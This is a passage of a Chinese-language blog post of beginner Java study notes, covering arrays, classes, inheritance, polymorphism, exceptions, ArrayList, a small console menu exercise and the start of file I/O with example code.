class="line">&#125;</span><br><span class="line">打印结果：</span><br><span class="line"><span class="number">30</span></span><br><span class="line"><span class="number">50</span></span><br><span class="line"><span class="number">8226</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法的重载：</span><br><span class="line">在同一个类中，方法名相同，形参列表不同的多个方法，构成了方法的重载。</span><br></pre></td></tr></table></figure>

<p>方法名重复 但形参列表不一样&#x2F;&#x2F;方法 的重载只和形参列表有关</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组是相同类型数据的有序集合。其中，每一个数据称作一个元素，每个元素可以通过一个索引（下标）来访问它们。</p>
<p>特点</p>
<p>1.长度是确定的数组一旦被创建它的大小就是不可以改变的。<br>2.其元素的类型必须是相同类型，不允许出现混合类型<br>3.数组类型可以是任何数据类型，，包括基本类型和引用类型。<br>4.数组有索引的：索索引l从0开始，到数组.length-1结束</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTArray</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//数组声明</span></span><br><span class="line">        <span class="type">int</span>[] ary;<span class="comment">//定义一个数组</span></span><br><span class="line">        ary = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];<span class="comment">//给定一个数组的长度10</span></span><br><span class="line">        <span class="comment">//int ary =new int[10];一句话，默认长度的每个元素有默认的值</span></span><br><span class="line">        <span class="comment">//数组的赋值；</span></span><br><span class="line">        ary[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        ary[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">        ary[<span class="number">2</span>] = <span class="number">31</span>;</span><br><span class="line">        ary[<span class="number">3</span>] = <span class="number">365</span>;</span><br><span class="line">        ary[<span class="number">4</span>] = <span class="number">456</span>;</span><br><span class="line">        <span class="comment">//数组的使用</span></span><br><span class="line">        System.out.println(ary[<span class="number">3</span>]);</span><br><span class="line">        System.out.println(ary[<span class="number">1</span>]+<span class="number">30</span>);</span><br><span class="line">        <span class="comment">//数组的遍历（查看数组的每一个元素）</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;i &lt;=<span class="number">3</span>;i++)&#123;<span class="comment">//i代表元素的索引</span></span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+ i +<span class="string">&quot;个元素&quot;</span>+ary[i]);</span><br><span class="line">            System.out.println(<span class="string">&quot;增强的for循环&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> num:ary)&#123;</span><br><span class="line">    System.out.println(num);</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="面向对象-—类和对象"><a href="#面向对象-—类和对象" class="headerlink" title="面向对象 —类和对象"></a>面向对象 —类和对象</h2><p>类：对对象向上抽取出像的部分、公共的部分以此形成类，类就相当于一个模版。<br>对象：模版下具体的产物可以理解为具体对象，对象就是一个一个具体的实例，就<br>相当于这个模版下具体的产品。<br>Java中先定义类，再创建对象。</p>
<p>类的编写<br>1.给类起一个见名知意的名字，首字母大写，驼峰命名原则。<br>2.类的特性编写，特性即类的属性部分。<br>3.类的行为编写，行为即类的方法部分。<br>对象的创建和使用<br>创建格式：类名对象名&#x3D;new类名();<br>给对象的属性赋值：对象名.属性名&#x3D;值；<br>调用对象的方法：[返回值类型名字&#x3D;]对象名.方法名(参数列表);</p>
<p>对象的创建</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test05;</span><br><span class="line"><span class="comment">//人类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line">    <span class="comment">//特性编写 属性（指定义与业务逻辑相关的代码）</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">double</span> height;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//行为 方法</span></span><br><span class="line">    <span class="comment">//定义一个学习的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;伞兵一号卢本伟准备就绪&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">使用</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> test05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//程序入口</span></span><br><span class="line">        <span class="comment">//对我们的person类进行创建</span></span><br><span class="line">        <span class="type">person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>();<span class="comment">//实例化一个对象</span></span><br><span class="line">        p1.name = <span class="string">&quot;Gu0f3n&quot;</span>;</span><br><span class="line">        p1.age = <span class="number">20</span>;</span><br><span class="line">        p1.height=<span class="number">181.99</span>;</span><br><span class="line">        System.out.println(p1.age);</span><br><span class="line">        System.out.println(p1.height);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p>作用</p>
<p>对于一个类来说，一般有三种常见的成员：<strong>属性、方法、构造器。</strong><br>这三种成员都可以定义零个或多个。<br><strong>构造方法</strong>也叫构造器，是一个创建对象时被<strong>自动调用</strong>的特殊方法，用于对象的<strong>初始化。</strong><br>Java通过new关键字来调用构造器，从而返回该类的实例。</p>
<p>构造器声明类型</p>
<p>声明格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[修饰符]类名（形参列表）</span><br><span class="line">//n条语句</span><br></pre></td></tr></table></figure>

<p>若无参数列表，称之为无参构造器（空构造器）<br>若有参数列表，称之为有参构造器</p>
<h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>我们程序设计追求“高内聚，低耦合”。</p>
<blockquote>
<p>高内聚：类的内部数据操作细节自己完成，不允许外部干涉；<br>低耦合：仅对外暴露少量的方法用于使用。<br>隐藏对象内部的复杂性，只对外公开简单的接口。便于外界调用，从而提高系<br>统的可扩展性、可维护性，提高程序的安全性。通俗的说，把该隐藏的隐藏起<br>来，该暴露的暴露出来。这就是封装性的设计思想。</p>
</blockquote>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p><strong>类是对对象的抽象</strong></p>
<p><strong>继承是对类的抽象</strong></p>
<p>随便写点代码练习一下</p>
<p>父类person</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">double</span> height;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHeight</span><span class="params">(<span class="type">double</span> height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//吃饭</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//睡觉</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sleep&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//打豆豆</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dadoudou</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;打豆豆哦&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">students</span> <span class="keyword">extends</span> <span class="title class_">person</span>&#123;<span class="comment">//子类继承自父类</span></span><br><span class="line">    <span class="comment">//定义子类自己的属性和方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> sno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSno</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sno;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSno</span><span class="params">(<span class="type">int</span> sno)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sno = sno;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;study&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">students</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">students</span>();</span><br><span class="line">        s.setSno(<span class="number">24710245</span>);</span><br><span class="line">        s.age=<span class="number">18</span>;</span><br><span class="line">        s.height=<span class="number">181.6</span>;</span><br><span class="line">        s.name=<span class="string">&quot;xiaobia&quot;</span>;</span><br><span class="line">        s.eat();</span><br><span class="line">        s.study();</span><br><span class="line">        s.dadoudou();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//发现具体的类我可以随意调用</span></span><br><span class="line">#eat</span><br><span class="line">#study</span><br><span class="line">#打豆豆哦</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>好处：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.提高 代码的复用性</span><br><span class="line"></span><br><span class="line">2.便于代码的扩展</span><br><span class="line"></span><br><span class="line">3.为了多态的使用</span><br></pre></td></tr></table></figure>

<p><strong>方法的重写</strong></p>
<p>发生在子类和父类，当子类对父类的提供的方法不满意的时候，要对父类方法进行重写</p>
<p><strong>格式要求</strong></p>
<p>子类的方法名字和父类必须一直，参数列表（个数，类型，顺序）</p>
<p><strong>与重载的区别</strong></p>
<p>重载：在同一个类中，当方法名相同，形参列表不同的时候，多个方法构成重载</p>
<p>重写：不同类中，子类对父类的提供方法不满意，可对父类进行重写</p>
<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p><strong>概念</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">多种状态，具体一点基于是去完成某个行为，当不同对象去完成时会产生出不同的状态。同意行为，不同的子类呈现的状态不同</span><br><span class="line">ps:多态与属性无关，多态指的方法的多态，而不是属性</span><br></pre></td></tr></table></figure>

<p>多态的三要素：继承，重写，父类引用指向子类对象</p>
<p>多态的好处：提高代码的扩展性</p>
<h2 id="异常的处理"><a href="#异常的处理" class="headerlink" title="异常的处理"></a>异常的处理</h2><p>异常就是在程序中的运行过程中所发生的不正常的时间，他会中断正在运行的程序</p>
<p>所需文件找不到<br>网络连接不通或中断<br>算术运算错 (被零除..)<br>数组下标越界<br>装载一个不存在的类或者对null对象操作<br>类型转换异常</p>
<p>Java提供异常处理机制。它将异常处理代码和和业务代码分离，使程序更优雅，更好的<br>容错性，高键壮性。<br>Java的异常处理是通过5个关键字来实现的：<strong>try、catch、finally、throw、throws</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try-catch执行情况</span><br><span class="line">情况1：try块中代码没有出现异常</span><br><span class="line">不执行catch块代码，执行catch块后边的代码</span><br><span class="line">情况2：try块中代码出现异常，catch中异常类型匹配（相同或者父类）</span><br><span class="line">Java会生成相应的异常对象，Java系统寻找匹配的catch块，执行catch块代码，执行</span><br><span class="line">catch块后边的代码。try块中尚未执行的语句不会执行。</span><br><span class="line">情况3：try块中代码出现异常，catch中异常类型不匹配</span><br><span class="line">不执行catch块代码，不执行catch块后边的代码，程序会中断运行</span><br><span class="line">catch块中如何处理异常</span><br><span class="line">其中一种方式：自定义内容输出</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//两个数求商</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">int</span> num1=<span class="number">12</span>;</span><br><span class="line">            <span class="type">int</span> num2=<span class="number">0</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;两个数的商&quot;</span>+num1/num2);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;对不起，程序有问题&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#对不起，程序有问题</span><br></pre></td></tr></table></figure>



<p>throw和throws的区别：<br>（1）位置不同：<br>throw：方法内部<br>throws：方法的签名处，方法的声明处<br>（2）内容不同：<br>throw+异常对象D<br>throws+异常的类型<br>（3）作用不同：<br>throw：异常出现的源头，制造异常。<br>throws：在方法的声明处，告诉方法的调用者，这个方法中可能会出现我声明的这些异<br>常。然后调用者对这个异常进行处理：要么自己处理要么再继续向外抛出异常。</p>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>数组的缺点 –.&gt; 集合的优点</p>
<p>（1）数组一旦指定了长度，那么长度就被确定了，不可以更改。<br>（2）删除，增加元素效率低。</p>
<p> （3）数组中实际元素的数量是没有办法获取的，没有提供对应的方法或者属性来获取</p>
<p>（4）对于无序的，不可重复的场合数组不能满足要求。</p>
<p>集合体系非常庞大</p>
<p>ArrayList()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test07;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.management.resource.internal.inst.SocketOutputStreamRMHooks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ArrayList</span>  <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">         list.add(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">         list.add(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">         list.add(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">        list.set(<span class="number">0</span>, <span class="string">&quot;D&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">        list.get(<span class="number">2</span>);</span><br><span class="line">        System.out.println(list.get(<span class="number">2</span>));</span><br><span class="line">        list.remove(<span class="number">2</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//[A, B, C]</span></span><br><span class="line"><span class="comment">//[D, B, C]</span></span><br><span class="line"><span class="comment">//C</span></span><br><span class="line"><span class="comment">//[D, B]</span></span><br></pre></td></tr></table></figure>

<p>简单写个小项目</p>
<p>写个小菜单</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test08;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.SQLOutput;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">//【选择你的心仪对象】</span></span><br><span class="line">  <span class="comment">// 展示女嘉宾</span></span><br><span class="line">  <span class="comment">// 上场女嘉宾</span></span><br><span class="line">  <span class="comment">// 下场女嘉宾</span></span><br><span class="line">  <span class="comment">// 退出</span></span><br><span class="line"><span class="comment">//女嘉宾编号 女嘉宾名字 女嘉宾年龄</span></span><br><span class="line"><span class="comment">//  1           wws        18</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//打印菜单</span></span><br><span class="line">        ArrayList list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>();<span class="comment">//空集合 注意作用范围，</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请选择你要的操作&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----1.展示女嘉宾-----&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----2.上场女嘉宾-----&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----3.下场女嘉宾-----&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----4.退出本项目-----&quot;</span>);</span><br><span class="line">            <span class="comment">//借助Scanner 类</span></span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">            <span class="comment">//利用键盘录入序号：</span></span><br><span class="line">            System.out.println(<span class="string">&quot;请输入要执行功能的序号:&quot;</span>);</span><br><span class="line">            sc.nextInt();</span><br><span class="line">            <span class="type">int</span> <span class="variable">choice</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="comment">//根据choice 录入功能序号进行后续判断</span></span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;1.展示女嘉宾&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=list.size()-<span class="number">1</span>;i++)&#123;</span><br><span class="line">                    Girl g=(Girl)(list.get(i));</span><br><span class="line">                    System.out.println(g.getGnum()+<span class="string">&quot;---&quot;</span>+g.getGname()+<span class="string">&quot;---&quot;</span>+g.getGage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;2.上场女嘉宾&quot;</span>);</span><br><span class="line">                <span class="comment">//从键盘录入女嘉宾编号</span></span><br><span class="line">                System.out.println(<span class="string">&quot;请为女嘉宾输入编号&quot;</span>);</span><br><span class="line">                <span class="type">int</span> gnum;</span><br><span class="line">                gnum = sc.nextInt();</span><br><span class="line">                System.out.println(<span class="string">&quot;请输入女嘉宾的名字&quot;</span>);</span><br><span class="line">                 String gname=sc.next();</span><br><span class="line">                System.out.println(<span class="string">&quot;请输入女嘉宾的年龄&quot;</span>);</span><br><span class="line">                <span class="type">int</span> gage=sc.nextInt();</span><br><span class="line">                Girl g=<span class="keyword">new</span> <span class="title class_">Girl</span>(gnum,gname,gage);</span><br><span class="line">                g.setGnum(gnum);</span><br><span class="line">                g.setGname(gname);</span><br><span class="line">                g.setGage(gage);</span><br><span class="line">                <span class="comment">//创建一个集合，用于存放一个相同个体</span></span><br><span class="line"></span><br><span class="line">                list.add(g);<span class="comment">//添加女嘉宾</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (choice == <span class="number">3</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;3.下场女嘉宾&quot;</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">delNo</span> <span class="operator">=</span> sc.nextInt();<span class="comment">//下场对应的女嘉宾</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=list.size()-<span class="number">1</span>;i++)&#123;</span><br><span class="line">                    Girl g=(Girl)list.get(i);</span><br><span class="line">                    <span class="keyword">if</span>(g.getGnum()==delNo)&#123;</span><br><span class="line">                        list.remove(g);</span><br><span class="line">                        System.out.println(<span class="string">&quot;可惜不是你，陪我到最后~~~&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;<span class="comment">//成功 停止遍历</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (choice == <span class="number">4</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;4.退出&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test08;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Gu0f3n.java.test05.Gire;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Girl</span> &#123;<span class="comment">//女嘉宾</span></span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="comment">//女嘉宾编号</span></span><br><span class="line">    <span class="comment">//名字</span></span><br><span class="line">    <span class="comment">//年龄</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> gnum;</span><br><span class="line">    <span class="keyword">private</span> String gname;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> gage;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getGname</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGname</span><span class="params">(String gname)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gname = gname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getGnum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gnum;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGnum</span><span class="params">(<span class="type">int</span> gnum)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gnum = gnum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getGage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGage</span><span class="params">(<span class="type">int</span> gage)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gage = gage;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Girl</span><span class="params">(<span class="type">int</span> gnum, String gname, <span class="type">int</span> gage)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gnum = gnum;</span><br><span class="line">        <span class="built_in">this</span>.gname = gname;</span><br><span class="line">        <span class="built_in">this</span>.gage = gage;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这上面基本上覆盖了之前学过的所有内容</p>
<h2 id="I-O流"><a href="#I-O流" class="headerlink" title="I&#x2F;O流"></a>I&#x2F;O流</h2><p>File 类作用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">File类对象可封装要操作的文件，可通过File类的对象对文件进行操作，如查看文</span><br><span class="line">件的大小、判断文件是否隐藏、判断文件是否可读等。</span><br><span class="line">局限：File类的相关操作，并不涉及文件内容相关的操作，这是单独依靠File类对</span><br><span class="line">象无法实现的操作，此时需要借助I/O流完成。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731325027010.png"></p>
<p>I&#x2F;O input&#x2F;output</p>
<p>分类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将I/O流理解为“管子”，那么生活中“管子&quot;怎么分类的呢？分类方式如下所示。</span><br><span class="line">方式1：按照方向划分。</span><br><span class="line">输入流、输出流。</span><br><span class="line">方式2：按照处理单元划分。</span><br><span class="line">字节流、字符流。</span><br><span class="line">方式3：按照功能划分。</span><br><span class="line">节点流、处理流</span><br></pre></td></tr></table></figure>

<p>i&#x2F;o流体系</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731325333620.png"></p>
<p>练习</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test09;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//对文件进行操作，将文件封装为file 对象</span></span><br><span class="line">        File f= <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\CTF\\Audacity\\java project\\java study\\src\\Gu0f3n\\java\\test.txt&quot;</span>);</span><br><span class="line">        <span class="comment">//输入字符流</span></span><br><span class="line">        <span class="type">FileReader</span> <span class="variable">fr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(f);</span><br><span class="line">        <span class="comment">//开始</span></span><br><span class="line"><span class="comment">//        int n1 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n1);</span></span><br><span class="line"><span class="comment">//        int n2 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n2);</span></span><br><span class="line"><span class="comment">//        int n3 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n3);</span></span><br><span class="line"><span class="comment">//        int n4 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n4);</span></span><br><span class="line"><span class="comment">//        int n5 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n5);</span></span><br><span class="line"><span class="comment">//        int n6 = fr.read();</span></span><br><span 